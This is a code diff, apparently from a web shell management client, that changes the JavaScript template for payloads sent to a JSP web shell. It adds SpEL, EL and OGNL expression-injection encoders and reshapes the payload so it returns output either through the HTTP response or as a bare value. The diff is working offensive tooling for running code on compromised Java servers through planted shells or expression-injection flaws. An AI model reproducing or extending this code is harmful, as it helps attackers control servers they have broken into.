@@ -41,7 +41,7 @@ class JSPJS extends Base {
    * @return {array} 编码器列表
    */
   get encoders() {
-    return [];
+    return ["spelbase64","el","ognl"];
   }
 
   get decoders() {
@@ -99,9 +99,6 @@ class JSPJS extends Base {
     var tag_s = "${tag_s.substr(0,tag_s.length/2)}"+"${tag_s.substr(tag_s.length/2)}";
     var tag_e = "${tag_e.substr(0,tag_e.length/2)}"+"${tag_e.substr(tag_e.length/2)}";
     try {
-      response.setContentType("text/html");
-      request.setCharacterEncoding(cs);
-      response.setCharacterEncoding(cs);
       function decode(str) {
         str = str.substr(#randomPrefix#);
         var bt=Base64DecodeToByte(str);
@@ -123,9 +120,12 @@ class JSPJS extends Base {
     } catch (e) {
       output.append("ERROR:// " + e.toString());
     }
+    var result=tag_s + asenc(output.toString()) + tag_e;
     try {
-      response.getWriter().print(tag_s + asenc(output.toString()) + tag_e);
-    } catch (e) {}
+      response.getWriter().print(result);
+    } catch (e) {
+      result;
+    }
     `.replace(/\n\s+/g, '').replace(/#randomPrefix#/g, this.__opts__.otherConf["random-Prefix"]);
     // 使用编码器进行处理并返回
     return this.encodeComplete(tag_s, tag_e, data);
